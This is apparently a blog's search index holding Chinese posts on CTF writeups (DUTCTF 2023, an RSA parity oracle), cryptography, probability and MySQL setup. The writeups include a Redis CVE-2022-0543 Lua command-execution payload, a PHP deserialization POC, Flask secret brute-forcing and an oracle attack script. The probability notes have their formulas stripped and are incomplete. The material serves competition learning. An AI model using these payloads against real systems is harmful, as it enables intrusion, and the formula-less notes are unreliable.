[{"title":"Advanced_RSA","url":"/2023/03/23/Advanced-RSA/","content":"RSA进阶Tools\n分解大质数\n\nFactordb （http://www.factordb.com）\n\nyafu （适用于p，q相差过大或过小的情况）\n\n\n\n\n​                https://sourceforge.net/projects/yafu/\n​                下载后在命令行中执行.\\yafu-x64.exe “factor(6)”或.\\yafu-x64.exe “factor(@)” -batchfile data.txt即可\n​    \n","categories":["CTF"],"tags":["CTF","CRYPTO","RSA"]},{"title":"同态加密 ElGamal方案","url":"/2023/05/05/ElGamal/","content":"同态加密 ElGamal方案原理ElGamal方案\ngenerate_keys(p,g)\n\n\n\\begin{align}\n&x\\in[1,p-1]\\\\\n&y=g^x\\ (mod\\ p)\\\\\n&\\rightarrow x,y\\\\\n\\end{align}\nencrypt(m,p,g,y)\n\n\\begin{align}\n&k\\in[1,p-1]\\\\\n&a=g^k\\ (mod\\ p)\\\\\n&b=(y^k\\ (mod\\ p))*m\\ (mod\\ p)\\\\\n&\\rightarrow a,b\\\\\n\\end{align}\ndecrypt(c,x,p)\n\n\\begin{align}\n&c=(a,b)\\\\\n&m=(a^{p-1-x}\\ (mod\\ p)*b)\\ (mod\\ p)\\\\\n&\\rightarrow m\\\\\n\\end{align}\n同态加密过程\n\n生成一个大素数和生成元\n用generate_keys(p,g)生成公钥和私钥\n将字节串明文转换为大整数\n用encrypt(m,p,g,y)进行加密\n\n\n同态解密过程\n用decrypt(c,x,p)进行解密\n\n\n\n加法同态\nhomomorphic_addition(c1, c2, p)\n\n\n\\begin{align}\n&c_1=(a_1,b_1)\\\\\n&c_2=(a_2,b_2)\\\\\n&c = (a_1a_2,b_1b_2)\\ (mod\\ p)\\\\\n&\\rightarrow c\n\\end{align}\n加密过程\n选择明文\n用encrypt(m, p, g, y)分别对进行加密，得到\n用homomorphic_addition(c1, c2, p)计算得到密文\n\n\n解密过程\n用decrypt(c3, x, p)进行解密\n\n\n\nEXPimport randomfrom Crypto.Util.number import *from hashlib import sha256def generate_keys(p, g):    \"\"\"生成公钥和私钥\"\"\"    x = random.randint(1, p-1)    y = pow(g, x, p)    return (x, y)def encrypt(m, p, g, y):    \"\"\"加密明文m\"\"\"    k = random.randint(1, p-1)    a = pow(g, k, p)    b = (pow(y, k, p) * m) % p    return (a, b)def decrypt(c, x, p):    \"\"\"解密密文c\"\"\"    a, b = c    m = (b * pow(a, p-1-x, p)) % p    return m# 选择大素数p和生成元gp = getPrime(215)g = 3# 生成公钥和私钥x, y = generate_keys(p, g)# 要加密的明文pt = b'flag{f1rst_attempt}'m = bytes_to_long(pt)# 加密明文c = encrypt(m, p, g, y)# 解密密文m_decrypted = decrypt(c, x, p)plain_text=long_to_bytes(m_decrypted)print(\"原始消息：\", pt, m)print(\"加密后的消息：\", c)print(\"解密后的消息：\", m_decrypted, plain_text)def homomorphic_addition(c1, c2, p):    \"\"\"密文的加法同态\"\"\"    a1, b1 = c1    a2, b2 = c2    c = ((a1 * a2) % p, (b1 * b2) % p)    return c# 选择两个明文m1和m2m1 = 12345m2 = 67890# 分别加密明文m1和m2c1 = encrypt(m1, p, g, y)c2 = encrypt(m2, p, g, y)# 对密文进行加法同态c3 = homomorphic_addition(c1, c2, p)# 解密得到加法结果m3 = decrypt(c3, x, p)print(\"加密前的明文：\", m1, m2, m1*m2)print(\"加密后的密文：\", c1, c2)print(\"同态加密后的密文：\", c3)print(\"解密后的明文：\", m3)\nOutput\n原始消息： b'flag{f1rst_attempt}' 2284117282071553800931956111894576012213646461加密后的消息： (34326925946024248202348149516524597794238307293963587312465083699, 29257544864745339573358716821088326225971289538713175924341045784)解密后的消息： 2284117282071553800931956111894576012213646461 b'flag{f1rst_attempt}'加密前的明文： 12345 67890 838102050加密后的密文： (37592138195462689660118434358852570152863680935153357241889524484, 1881167267842650302000965248563504534698498707009490637556715361) (10920357203713901658735049057071888229387493718439911523237682598, 19754766075170064385339139856259981647190642647308101159400975124)同态加密后的密文： (25162036149156949807143289802167075308069263753806093110671488815, 28248364394465727513102472477303058997839331903759424249041835410)解密后的明文： 838102050\n","categories":["Vulnerability_recurrence"],"tags":["Study","Mathematical statistics"]},{"title":"[DUTCTF 2023] Writeup by Z3ds1ch","url":"/2023/03/28/DUTCTF_wp/","content":"\n\n[DUTCTF 2023] Writeup by Z3ds1ch小摸了个Second，可惜没有AK WEB，好好学习下次加油，&gt;_&lt;\nMisc*签到题做题记录被删了qwq\n直接b站视频一个个翻评论就能找到flag\n*Minecraftwurstclient直接xray+flight+fullbright，配合饼图找非自然方块找到箱子，从书与笔中获得flag\n我在哪?🥵\n在右上角可以发现十八中和CIC，又已知这是江边，搜索这些关键词就能找到答案曾家岩，md5加密即可\n（某个网站md5加密坏了好几年了一直不修，我不说是谁，还得用cyberchef）\n不要更新！\n在流量包里搜索字符串flag，可以找到一个Github的Repository，找到这个仓库（https://github.com/IShiraiKurokoI/Flag），仓库里有1.0.0的Release版本，根据题目描述不要更新可以联想到需要找到之前的版本/日志，直接使用Github自带的compare功能就能找到flag，一眼凯撒，直接转就行\n\nez_img解压之后只有一张图片2.png\n\n先拖进010editor中扫一眼\n\n显然最后一个IDAT块有些问题，但提取有些困难，暂且按下不表，先看看有没有简单的，Ctrl+F搜索字符串flag，找到了flag头，直接Base64 Decode即可\n\n再尝试一下是不是藏东西了，直接foremost拆出来4.png和QRcode\n\n\n4.png的flag中间一段直接送了，显然QRcode是最后一段了，直接脚本转成二维码就行\nfrom PIL import Imagefrom gmpy2 import *import sysfrom zlib import *sys.set_int_max_str_digits(0)MAX = 500pic = Image.new(\"RGB\",(MAX,MAX))with open \"QRcode\" as f:    str=f.readline()str=bin(int(str))print(iroot(len(str),2))i=0for y in range(0,MAX):    for x in range(0,MAX):        if(str[i] == '1'):            pic.putpixel([x,y],(0,0,0))        else:pic.putpixel([x,y],(255,255,255))        i = i+1pic.show()pic.save(\"flag.png\")# DUTCTF{3E07747C-E552-EC96-003C-F3DBD9CD6704}\n看雪❄自从那个冬夜看雪，一晃已是二十年，当年的脚本小子们都在哪个irc频道聊天呢？flag格式为DUTCTF{ip:port#频道名}\n看到题目描述能判断出是要社工出看雪论坛的irc频道，先去bbs.kanxue.com找一下线索\n\n尝试了一下果然不对，使用方法给的连接也无效了，联想到之前有一篇讲看雪创始的新闻https://zhuanlan.zhihu.com/p/23831052，标题是自从那个冬夜看雪，一晃已是十六年，所以可能是要找2003年左右的irc频道，再继续往下翻论坛的评论区可以证实我们的猜想\n\n坛主说在三四年前（2002/2003）确实有过irc频道，但我们在现在的论坛里找不到当时的记录了，可能是时间过久被删除或是因为其他原因不见了，在https://www.pediy.com/kssd/pediy05/pediy50326.htm里可以找到一些之前的帖子，但很多帖子还是失效了，找了很久还是无果，所以只能尝试用网页快照来恢复。但很可惜百度快照、Google快照等等功能都被关闭了，国内的忆往昔保存的网页历史快照最早只有2022年，在一番搜索下找到了WayBackMachine:archive.org，搜索之前发现的失效的地址www.pediy.com/irc.htm可以找到当时的记录\n\n随便点开一篇最开头就能找到答案了\n\n\nREVERSE*贪吃蛇拖进ida里直接Shift+F12就能找到flag了\nGAME!下棋就行（为了帮忙测试新附件对不对又重下了一遍）\n\n\nezdraw拖进ida里按空格会报错The graph is too large to be displayed，搜索解决方案后再按空格就能看到flag了\n\n\nCRYPTO上次AK了CRYPTO，现在正在转WEB的途中，难题都没出，只能说老本行手生了\n*老滚五直接龙语翻译即可\n*神奇的短信因为题目信息是诺基亚，题目描述里又说是全大写字母，可以联想到是键盘输入字母\n其实是猜的，五位全字母显然是队名啊qwq\nshamir​        shamir基本原理\n​        假设我们存在一个秘密S，把秘密S进行特定运算，得到w个秘密碎片，交给w个人保存，当至少t个人同时拿出自己所拥有的秘密碎片时，即可还原出最初的秘密S。\n​        秘密碎片生成：\n​        我们先构造一个多项式：，其中，s是我们的秘密，p是一个素数，而且满足，取w个不相等的x，代入中，得到w组，分配给w个人，公开p，销毁多项式，每个人负责保密自己的\n​        秘密恢复\n​        当时，，即可恢复s，将i组带入下面这个式子即可，\nEXPimport Crypto.Util.number as numbimport randomdef oj(a, n):    a = a % n    s = [0, 1]    while a != 1:        if a == 0:            return 0        q = n // a        t = n % a        n = a        a = t        s += [s[-2] - q * s[-1]]    return s[-1]def create(max_length=513, secret_is_text=0, p=0):    if not p:        p = numb.getPrime(max_length)    w = int(input(\"请输入秘密保存人数：\"))    t = int(input(\"请输入秘密恢复所需人数：\"))    while not (t &gt; 0 and t &lt;= w):        t = int(input(\"请重新输入：\"))    s = input(\"请输入你的秘密:\")    if secret_is_text:        s = numb.bytes_to_long(s.encode(\"utf-8\"))    else:        try:            s = int(s)        except Exception as e:            s = numb.bytes_to_long(s.encode(\"utf-8\"))    x_list = list()    a_list = list()    i = w    while i &gt; 0:        x = random.randint(p // 2, p)        if x not in x_list:            x_list.append(x)            i -= 1    for a in range(t):        a_list.append(random.randint(p // 2, p))    result = list()    for x in x_list:        y = s        for a_n in range(t):            a = a_list[i]            y += a * pow(x, i + 1, p)        result.append((x, y))    return t, p, resultdef restore(p, information, get_text=1):    x_list = list()    y_list=list()    for x, y in information:        x_list.append(x)        y_list.append(y)    s = 0    for x_i in range(len(x_list)):        tmp_num = y_list[x_i]        x_i_j = 1        for x_j in range(len(x_list)):            if x_i != x_j:                tmp_num = tmp_num * (0 - x_list[x_j]) % p                x_i_j *= x_list[x_i] - x_list[x_j]        tmp_num = tmp_num * oj(x_i_j, p) % p        s += tmp_num    s = s % p    print(s)    if get_text:        try:            s = numb.long_to_bytes(s)            s = s.decode(\"utf-8\")        except Exception as e:            print(e)    return st, p, result = create() print(result)print(restore(p, result[:t])) \n随机数的力量看题目发现和去年SSSCTF 2022一样，所以猜测还是和预测随机数有关，先看一下task.py，唯一有用的是下面这一段\ndef handle(self):    self.send(b'welcome to this guess game!')    self.send(b'please tell me your name:', newline=False)    name = self.recv()    if bytes_to_long(name).bit_length() &lt;= 32:        self.send(b'flag')        exit()    self.send(b'Let\\'s guess!')    while True:        guess = random.randint(0, bytes_to_long(name))        self.send(b'&gt;', newline=False)        if int(self.recv().decode()) == guess:            self.send(flag)        else:            self.send(b'sorry, but the num is:', newline=False)            self.send(str(guess).encode())\n我们需要发送一个name，且满足bytes_to_long(name).nbit_length()&gt;32，随后服务端会调用randint()函数，从0到bytes_to_long(name)中随机生成一个数让我们进行猜测\n首先我们需要知道，Python中的random模块是可以人为破解的，其底层是使用梅森旋转算法来生成伪随机数序列，可以先去了解一下：https://blog.csdn.net/tianshan2010/article/details/83247000，由于生成算法已知，所以可以人为预测，可以采用的python库有Python-random-module-cracker和mersenne-twister-predictor，虽然前者可以直接预测randint()，但只能预测(0,4294967294)这个范围内的数，所以要用后者，但官方提供的只有getrandbits()。我们查看一下getrandbits()的源码，可以发现一条利用链：实际上randint(a,b)函数返回值的生成过程，是调用randrange(a,b+1)函数。而randrange(a,b+1)函数是先获取宽度width=b+1-a，然后当宽度大于最大宽度时，调用a+_randbelow(width)函数。而_randbelow(width)函数，首先计算k = _int(1.00001 + _log(n-1, 2.0))，相当于计算width转化成二进制位有多少位，然后在调用getrandbits(k)。由于预测32位的随机数需要传624个参数，简单推导一下就可以知道传312个参数就可以预测64位的随机数\nEXPimport randomfrom mt19937predictor import MT19937Predictorpredictor = MT19937Predictor()name_num=2**64-2name=long_to_bytes(name_num)io=remote(\"210.30.97.133\",28044)io.recvuntil(b'please tell me your name:')io.sendline(name)for i in range (312):    print(\"Times: \",i)    io.recvuntil(b'&gt;')    io.sendline(b'1')    io.recvuntil(b'sorry, but the num is:')    num = io.recvline()    num = int(num)    # print(num)    predictor.setrandbits(num,64)io.recvuntil(b'&gt;')predict_num=bytes(str(predictor.getrandbits(64)).encode())# print(predict_num)io.sendline(predict_num)print(io.recvline())\n\nPWN*中间人简单的滚动码开车门，intercept之后发送下一次的信号就能开门了\n\nWEB非常的可惜没有AK，转WEB没多久，sql还没怎么学，果然还是不能急于求成\nembryo_webBurpSuite抓个包看注释就有flag了\n*Trenja直接玩两个小游戏就能出flag，但还是比较推荐翻js的源码\nbabyphp简单的php反序列化，随手构造个链子就行：User-&gt;__destruct()-&gt;Info-&gt;update()-&gt;win()\nPOC$a='O:4:\"User\":3:{s:4:\"name\";s:5:\"admin\";s:6:\"passwd\";N;s:4:\"info\";O:4:\"Info\":3:{s:3:\"age\";N;s:8:\"nickname\";s:5:\"admin\";s:8:\"birthday\";N;}}';\nfake_session先上题\nfrom flask import Flask, sessionimport randomimport my_secretapp = Flask(__name__)app.config['SECRET_KEY'] = my_secret.my_secret()@app.route('/')def hello_world():    if not session.get('user'):        session['user'] = ''.join(random.choices(\"23333\", k=5))    return 'Hello {}!'.format(session['user'])@app.route('/admin')def admin():    if session.get('user') != \"admin\":        return \"you are not admin!go away\"    else:        flag = ''        with open('/flag', 'r') as f:            for line in f:                flag += line        return 'Congratulations! You logged in as admin. Here is the flag:{}'.format(flag)if __name__ == '__main__':    app.run(host='0.0.0.0', port=8080)\n显然是伪造session的题，cookie里用flask_unsign直接伪造就行，我们没有secret，但提示了是弱口令，自己写个字典爆破一下就能出\nimport stringimport flask_unsigntable = string.ascii_letters + string.digits# s = string.digits# s=[\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\"]index=[]for s1 in table:    for s2 in table:        for s3 in table:                s=s1+s2+s3                index.append(s)l=len(index)with open (\"index.txt\",mode=\"w\") as f:    for i in range (l):        if (i%10000==0):            print(\"times:\",i)        f.write(\"\\\"\")        f.write(index[i])        f.write(\"\\\"\\n\")\n爆破一下secret\nPS C:\\&gt; flask-unsign --unsign --cookie 'eyJ1c2VyIjoiMzMyMjMifQ.ZCBOug.JAGEY2qy_y_fzPhWoQWYw95jSf4' --wordlist \"index.txt\"[*] Session decodes to: {'user': '33223'}[*] Starting brute-forcer with 8 threads..[+] Found secret key after 216448 attempts'4rc'\n然后伪造一下数字签名，用cookie edior改一下cookie就可以了\ncve去年[虎符CTF 2022] Quest-RCE原题，利用了CVE-2022-0543来进行沙盒逃逸\nlocal io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\");local io = io_l();local f = io.popen(\"id\", \"r\");local res = f:read(\"*a\");f:close();return res---在\"id\"进行这里恶意代码注入\n读一下源码发现有base64.StdEncoding.DecodeString(custom)，所以payload要进行一次Base64加密\nPOST doCustom路由，对custom传参payload就行\n","categories":["CTF"],"tags":["CTF","CRYPTO","DUTCTF 2023","MISC","PWN","WEB"]},{"title":"概率论与数理统计知识梳理（一）","url":"/2023/04/03/Probability-theory-and-mathematical-statistics_Chapter_1/","content":"概率论与数理统计第一章 概率论的基本概念1.1 随机事件及其运算\n随机现象（随机事件）的特征\n该试验可在相同条件下重复进行\n所有可能出现的结果是已知的\n试验之前不可预知哪个结果会出现\n\n\n以表示随机试验的所有可能结果组成的集合，并称之为随机试验对应的样本空间，的元素称为样本点，即样本点就是可能结果\n\n随机事件对应的样本空间的子集称为随机试验的随机事件\n\n事件的包含与相等\n\n若事件的每一个样本点都包含在事件中，则称事件包含事件，记作。\n\n若且，则称事件与相等，记为\n\n\n\n和事件\n\n与的和事件记作或\n\n\n积事件\n\n与的积事件记作或\n\n\n差事件\n\n与的差事件记作，发生的充要条件为发生而不发生\n\n\n补事件\n\n设为随机事件，称为事件的补事件\n\n\n\n互不相容\n\n若，则称与互不相容，或互斥\n\n\n事件运算原则\n\n交换率：\n结合律：\n分配率：\n德摩根率：\n\n\n\n1.2 概率的定义及其基本性质\n频率的定义\n设是随机试验，是它的样本空间，为的一个事件，将试验重复进行次，其中事件发生了次，则称为发生的频率，记作\n\n\n频率的性质\n\n非负性：\n归一性：\n有限可加性：若为两两互不相容的事件，则有\n\n\n频率是概率的统计学定义\n\n概率的定义\n\n非负性：\n归一性：\n可加性：若为两两互不相容的事件，则有\n\n\n概率的性质\n\n\n有限可加性：若为两两互不相容的事件，则有\n若，则\n\n减法公式：\n加法公式：\n\n\n\n1.3 等可能概型（古典概型与几何概型）\n古典概型的定义\n\n样本空间中的样本点总数是有限的\n每个样本点出现的可能性相同\n\n\n三种取法，设有个不同的球，要从中取个球（）\n\n第一种取法：可重复或者有放回：样本点总数为\n第二种取法：不放回但与次序无关：样本点总数为\n第三种取法：不放回且与次序有关：样本点总数为\n\n\n分房问题：将个人随机分到个房间去（），每个人分到哪个房间是等可能的，且假设每个房间可容纳的人数没有限制，（1）求某个指定的房间恰有个人的概率，（2）求每两个人都不在同一个房间的概率\n\n（1）\n（2）\n\n\n抽签问题：设有个人一起抽签，但只有个签（），求第个人抽到签的概率（）\n\n\n先抽后抽的概率是一样的，感觉上的不同是由于条件概率的存在\n\n\n分组法：将个不同的球分成个不同的组，使得这个组各有个球，，问共有多少种分法\n\n\n\n\n几何概型：在一个面积为的平面区域中等可能地任意投点，设，为比例系数，则有可得，所以\n\n会面问题：两人相约点到点在某地会面，先到者等候另一人，过时就离开，求这两人能会面的概率\n\n以分别表示两个人的到达时刻，则会面的充要条件是，可以参考下图求出\n\n\n\n\n1.4 条件概率\n条件概率的定义：在事件发生的条件下，事件发生的概率，记作\n\n条件概率的性质\n\n非负性：对任意事件，有\n归一性：\n可列可加性：对任意一列两两互不相容的事件，有\n\n\n乘法公式：若，则\n\n抽签问题（续）：设有个签，只有个人可以中奖，求第个人抽到签的概率（）\n\n\n\\begin{align}\nP(A)&=P(A_{1}A_{2}...A_{k-1}A_{k})=P(A_{1})P(A_{2}|A_{1})P(A_{3}|A_{1}A_{2})...P(A_{k}|A_{1}A_{2}...A_{k-1})\\\\\n&=\\frac{n-1}{n}\\times\\frac{n-2}{n-1}\\times\\frac{n-3}{n-2}\\times...\\times\\frac{n-k+1}{n-k+2}\\times\\frac{1}{n-k+1}\\\\\n&=\\frac{1}{n}\\\\\n\\end{align}\n\n\n划分的定义：设为一组事件，满足（1），（2），则称为的一个划分\n\n全概率公式：设为的一个划分，则对任意的事件，有\n使用全概率公式的情况\n（1）随机试验可以分为两个相互影响的阶段\n（2）第一阶段所有可能结果已知\n（3）所求概率为第二阶段结果之概率\n\n\n贝叶斯公式：设是的一个划分，若，则对任意事件，只要，就有\n\n1.5 独立性与伯努利试验\n事件与独立的等价条件是\n事件与独立的性质\n若，则\n在这四对事件中，若有一对独立，则其他三对也独立\n\n\n重伯努利试验的定义：如果试验只有两个可能的结果：及，且。把试验重复做次构成一个试验，用表示，。这个试验称为重伯努利试验\n推广：在次独立重复试验中，若事件，在每次试验中发生的概率均为，那么在这次试验中恰好发生次的概率为，其中\n\n","categories":["Vulnerability_recurrence"],"tags":["Study","Mathematical statistics","Probability theory"]},{"title":"Parity_RSA 二分法攻击","url":"/2023/03/10/Parity/","content":"Parity_RSA[QCTF] baby_rsa\nAnalyze先看题：\nimport socketserverfrom secret import flagimport signalfrom Crypto.Util.number import *import randomimport stringfrom hashlib import sha256table = string.ascii_letters + string.digitsmenu = b'''Give me your information and I'll tell you about the parity after decryption.Let me see your options...1.encrypt message2.get flag3.exit'''e = 0x10001p = getPrime(512)q = getPrime(512)N = p * qphi = (p - 1) * (q - 1)d = inverse(e, phi)class Task(socketserver.BaseRequestHandler):    def _recvall(self):        BUFF_SIZE = 2048        data = b''        while True:            part = self.request.recv(BUFF_SIZE)            data += part            if len(part) &lt; BUFF_SIZE:                break        return data.strip()    def send(self, msg, newline=True):        try:            if newline:                msg += b'\\n'            self.request.sendall(msg)        except:            pass    def recv(self, prompt=b'[-] '):        self.send(prompt, newline=False)        return self._recvall()    def proof_of_work(self):        proof = (''.join([random.choice(table) for _ in range(12)])).encode()        sha = sha256(proof).hexdigest().encode()        self.send(b\"[+] sha256(XXXX+\" + proof[4:] + b\") == \" + sha)        XXXX = self.recv(prompt=b'[+] Give Me XXXX :')        if len(XXXX) != 4 or sha256(XXXX + proof[4:]).hexdigest().encode() != sha:            return False        return True    def handle(self):        print(1)        signal.alarm(2400)        if not self.proof_of_work():            self.send(b'bye~')            return        self.send(menu)        self.send(('e = ' + hex(e)).encode())        self.send(('N = ' + hex(N)).encode())        while True:            num = self.recv(prompt=b'what\\'s your choise?')            if num == b'1':                c = int(self.recv(prompt=b'the message:').decode(), 16)                m = pow(c, d, N)                if m % 2:                    self.send(b'odd...')                if m % 2 == 0:                    self.send(b'even...')            elif num == b'2':                c = pow(bytes_to_long(flag, e, N))                self.send(('c = ' + hex(c)).encode())            elif num == b'3':                self.send(b'bye~')                return            else:                return        class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer):    passclass ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer):    passif __name__ == \"__main__\":    HOST, PORT = '0.0.0.0', 10000    server = ForkedServer((HOST, PORT), Task)    server.allow_reuse_address = True    print(HOST, PORT)    server.serve_forever()\n先nc一下题目提供的端口：\nncat scr1w.dlut.edu.cn 28088#Output:#[+] sha256(XXXX+iemdocJd) == 419017b5ab02fca75dc806b09ce4bbec1fafe03292d5e17a54551cb2d00b7f40#[+] Give Me XXXX :\n简单的sha256爆破：\nfrom pwn import *from hashlib import sha256from gmpy2 import *def break_sha(last, shav):    s = string.ascii_letters + string.digits    for v1 in s:        for v2 in s:            for v3 in s:                for v4 in s:                    t = (v1 + v2 + v3 + v4).encode() + last                    if sha256(t).hexdigest() == shav:                        return (v1 + v2 + v3 + v4).encode()s1=b'iemdocJd's2=b'ee2571d3f23fb615fdbe01cea04a20352920f0b02c65e06fc14aa71cb20067e1'print(break_sha(s1,s2.decode()))\n#Output:#Give me your information and I'll tell you about the parity after decryption.#Let me see your options...#1.encrypt message#2.get flag#3.exit##e = 0x10001#N = #0xab068236ae895f50991b85a495b05cab628f23408c6847aa19cb91e6b22e5b1a4e67d1c99b36f53da55230a26b496cb60a5092c728a24ffc0e5a195a456481f1e4c82512af6b8003e092045aa0b3dc79c4d12beea95729e6c1fce16215e0ef47d77bb3dc7417006a16af9b88841627c4462608af4e6d4fa8f369d126cf8bbad9#what's your choise?#Input:#2#Output:#c = 0x5fff63ca6bbf96b571128a2502bee3de7be1be0cb84e6f70c2750aaf174475335e0cb59a54a2811154b2c76dd01a2a05660b5485efbfc956d05f254b9fbac53644eea31ea59cc8a8782b4618558aeff0129d85d24dbc0adf431d0929a26803035cff7a2cbc7da52c4dee682078d46e15c2849898fa3defbc700c5878314ae646\n通过输入一个加密的密文，服务器会告诉你用私钥d解密该密文后，所得的明文结果是even还是odd，通过这种机制，我们可以向服务器传入的值进行一些修改操作，我们传入 即 为，而服务器会将解密成后告诉我们其模下的奇偶性。即为，而服务器会将解密成后告诉我们其模下的奇偶性。即为，而服务器会将解密成后告诉我们其模下的奇偶性。\n我们知道任意一个自然数,其与的乘积一定为偶数，所以在下：\n若，即解密后的传入参数没有经过取模操作的话,那么其奇偶性一定为even，因为为偶数\n若，即解密后的传入参数经过了取模操作，那么其奇偶性一定为odd，因为为偶数，为奇数\n根据上面两点我们可以得到以下结论：\n若返回even，则\n若返回odd，即\n通过返回的结果，我们可以将明文所在的缩小到原来范围的，若我们继续传入，则可将范围再次缩小\n如此进行下去，我们只需要次即可得到\n\nEXPfrom pwn import *from hashlib import sha256from gmpy2 import *from Crypto.Util.number import *e = 0x10001n = 0x93022347fcf4a51c3a62dc83e93f4dc91dc6331b5541cd912fd7e0891a8419ce77fce50220cff791d9d7ca4f3af19531a3358a0301f85f284441a4ea9b38c84aa7901a11c9f6a5d6305933635294197d2f6cd63f9649ca9669a766e7f802a668d9b265d30fe8b657d369919ad278c52de26fac04e42f750999cce7dd6eb75a0fc = 0xec722e27f20c32794072fa699c7a657bee39134accd623166c785a8e44f22a5523274f68eda3c75a5117ddc9cc13fcfd611a4971530a6e6bf166b3cfdf7e92fd943c17d8b25990bfe24bc7718232789e4e2126b08d7117b4c90aa0702ef83d9cf98583f02c819676535e60c84f918dec8cd57a39dbf2d5a62924339cc00f665def break_sha(last, shav):    s = string.ascii_letters + string.digits    for v1 in s:        for v2 in s:            for v3 in s:                for v4 in s:                    t = (v1 + v2 + v3 + v4).encode() + last                    if sha256(t).hexdigest() == shav:                        return (v1 + v2 + v3 + v4).encode()ldata=0rdata=nnum=0io = remote(\"scr1w.dlut.edu.cn\", 28092)io.recvuntil(b'sha256(XXXX+')str1 = io.recvuntil(b')', drop=True)print(str1)io.recvuntil(b'== ')str2 = io.recvuntil(b'\\n', drop=True)print(str2)res = break_sha(str1, str2.decode())print(res)io.recvuntil(b'[+] Give Me XXXX :')io.sendline(res)while rdata-ldata&gt;2:    num+=1    t=powmod(2,num*e,n)    data=hex((c*t)%n)[2:]    io.recvuntil(b\"what's your choise?\")    io.sendline(b'1')    # io.recvuntil(b'the message:')    io.recv()    io.sendline(data)    ans=io.recvline()    print(ans)    if ans==b'odd...\\n':        ldata = (ldata + rdata) // 2 if (ldata + rdata) % 2 == 0 else (ldata + rdata) // 2 + 1    elif ans==b'even...\\n':        rdata = (ldata + rdata) // 2 if (ldata + rdata) % 2 == 0 else (ldata + rdata) // 2 + 1    print(rdata-ldata)    # print(ldata,rdata)# while powmod(ldata,e,n)!=c:#     ldata-=1print(\"l=\",ldata)print(\"r=\",rdata)print(long_to_bytes(ldata))\n","categories":["CTF"],"tags":["CTF","CRYPTO","RSA"]},{"title":"概率论与数理统计知识梳理（二）","url":"/2023/04/04/Probability-theory-and-mathematical-statistics_Chapter_2/","content":"概率论与数理统计第二章 随机变量及其分布2.1 随机变量及其分布函数\n随机变量的定义：设为一个样本空间，若对任意，都有一个实数与之对应，则称为一个随机变量\n\n分布函数的定义：设为一个随机变量，称为随机变量的分布函数\n\n分布函数的性质\n\n\n为的右连续函数，即对\n为的单调不减函数\n\n\n\n\n2.2 离散型随机变量\n分布列的定义：如果随机变量的所有可能取值为一列离散的点，，则称为一个离散型随机变量，并称概率为的分布列，可以记作下面的形式\n\n\\begin{align}\nX\\sim\n\\left(\\begin {array}{c}\nx_1&x_2&x_3&...\\\\\np_1&p_2&p_3&...\\\\\n\\end{array}\\right)\n\\end{align}\n离散型随机变量的分布函数必定为阶梯函数，反之，分布函数为阶梯函数的随机变量必为离散型随机变量\n\n离散型随机函数的分布函数的性质\n\n非负性：\n归一性：\n\n\n常见的离散型随机变量\n\n二项分布：，其中，称为分布\n泊松分布：，其中\n泊松逼近定理：\n二项分布的极限是泊松分布\n几何分布：\n几何分布的无记忆性：设服从参数为的几何分布，那么对任何正整数，都有\n超几何分布：，其中\n\n\n\n2.3 连续型随机变量\n密度函数的定义：设为一个随机变量，如果存在一个可积函数，使得的分布函数满足，则称为一个连续型随机变量，并称为的概率密度函数\n\n密度函数的性质\n\n非负性：\n归一性：\n由归一性可知，介于密度函数曲线与轴之间的图形的面积为\n在密度函数的连续点处有，即密度函数为分布函数的导数\n如果为连续型随机变量，则\n\n\n常见的连续型随机变量\n\n均匀分布：\n\n\\begin{align}\n&X\\sim U(a,b)\\Rightarrow\\\\\n&密度函数：f(x)=\n\\begin {cases}\n\\frac{1}{b-a}&a","categories":["Vulnerability_recurrence"],"tags":["Study","Mathematical statistics","Probability theory"]},{"title":"初见MySQL——基础篇","url":"/2023/03/09/MySQL_1/","content":"初见MySQL——基础篇1.安装MySQL（zip archive）windows环境下不推荐用安装包安装，之后清理注册表比较麻烦\nzip archive website:https://dev.mysql.com/downloads/mysql/\n解压之后在文件夹里新建一个my.ini作为配置文件（新版本不自带这个）\n#my.ini[mysql]# 设置mysql客户端默认字符集default-character-set=utf8mb4[mysqld]#设置3306端口port = 3306# 设置mysql的安装目录basedir=D:\\mysql\\mysql-8.0.32-winx64# 设置mysql数据库的数据的存放目录datadir=D:\\mysql\\data # 允许最大连接数max_connections=200# 服务端使用的字符集默认为UTF8character-set-server=utf8mb4# utf8bm4即utf-8# 创建新表时将使用的默认存储引擎\n其中basedir和datadir需要根据解压目录和数据存放地址进行修改，建议在mysql-8.0.32-winx64同级新建一个data文件夹用于存放数据\n以管理员身份运行cmd命令，并切换到安装目录下的bin下\n初始化MySQL：\nmysqld --initialize --console#Expected output:#2023-03-06T04:35:17.961027Z 0 [System] [MY-013169] [Server] D:\\mysql\\mysql-8.0.32-winx64\\bin\\mysqld.exe (mysqld 8.0.32) #initializing of server in progress as process 23832#2023-03-06T04:35:17.979526Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.#2023-03-06T04:35:18.172968Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.#2023-03-06T04:35:18.707708Z 6 [Note] [MY-010454] [Server] A temporary password is generated for root@localhost: ************#Possible errors:#如果执行后报错：无法启动此程序，因为计算机中丢失VCRUNTIME140_1.dll，尝试重新安装此程序以解决此问题#Tips:#*号处是初始密码，需要保存下来\n安装MySQL：\nmysqld --install#Expected output:#Service successfully installed.\n登录数据库：\nmysql -u root -p#Expected output:#Enter password: ************#Welcome to the MySQL monitor.  Commands end with ; or \\g.#Your MySQL connection id is 9#Server version: 8.0.32#Possible errors:#ERROR 2003 (HY000): Can&#x27;t connect to MySQL server on &#x27;localhost:3306&#x27; (10061)#MySQL服务未开启#win+r,输入&quot;services.msc&quot;#找到&quot;MYSQL&quot;,右键选择&quot;属性&quot;,将&quot;启动类型&quot;改为&quot;自动&quot;,点击&quot;服务状态&quot;中的&quot;启动&quot;即可#ERROR 1045 (28000): Access denied for user &#x27;root&#x27;@&#x27;localhost&#x27; (using password: NO)#密码输错了，记得是初始密码\n修改初始密码：\nALTER USER root@localhost IDENTIFIED BY &#x27;********&#x27;;#Expected output:#Query OK, 0 rows affected (0.02 sec)\n2.MySQL基础操作2.1 查看数据库SQL是一种语言\nSQL是一种语言\nSQL是一种语言\n一定不能忘记加分号，分号说明这条语句结束，每个单词之间记得空格，这里展示所有的数据库，base后面记得加s，ctrl + 